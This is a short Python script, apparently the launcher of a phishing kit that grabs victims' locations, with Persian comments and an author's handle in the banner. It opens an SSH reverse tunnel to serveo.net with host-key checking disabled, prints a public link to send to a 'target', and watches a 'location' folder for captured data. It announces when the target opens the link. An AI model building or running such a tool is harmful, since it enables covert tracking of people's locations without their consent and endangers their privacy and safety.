import os
import subprocess
import time
import re
from colorama import Fore, Style, init

init(autoreset=True)

def print_clean(message):
    """Print message at the start of line without indentation"""
    print("\r" + message.lstrip(), end="", flush=True)

print(Fore.CYAN + "I'm gololeh")
print(Fore.YELLOW + "My channel: " + Fore.LIGHTBLUE_EX + "@chanel_culer")
print()

print(Fore.MAGENTA + "[+] Connecting to Serveo...")

serveo_cmd = ['ssh', '-o', 'StrictHostKeyChecking=no', '-R', '80:localhost:8080', 'serveo.net']
proc = subprocess.Popen(serveo_cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)

serveo_link = None
while True:
    line = proc.stdout.readline()
    if not line:
        continue
        
    # پردازش خطوط Serveo
    if "Forwarding" in line or "http" in line.lower():
        match = re.search(r'https://[a-zA-Z0-9\-]+\.serveo\.net', line)
        if match:
            serveo_link = match.group(0)
            print(Fore.GREEN + "\n[+] Serveo Link: " + Fore.WHITE + serveo_link + "\n")
            break  # خروج از حلقه پس از دریافت لینک

if not serveo_link:
    print(Fore.RED + "[!] Failed to retrieve Serveo link!")
    proc.terminate()
    exit()

location_dir = "location"
if not os.path.exists(location_dir):
    os.makedirs(location_dir)

prev_files = set(os.listdir(location_dir))
print(Fore.MAGENTA + "[+] Waiting for target to open the link...")

try:
    while True:
        time.sleep(1)
        current_files = set(os.listdir(location_dir))
        new_files = current_files - prev_files
        if new_files:
            print(Fore.RED + Style.BRIGHT + "\n[+] Target opened the link!\n")
            break
        # رفع خطای ljust با تبدیل به رشته
        dots = "." * (int(time.time()) % 4 + 1)
        print_clean(Fore.MAGENTA + dots.ljust(4))
except KeyboardInterrupt:
    print(Fore.YELLOW + "\n[!] Interrupted by user")
finally:
    proc.terminate()
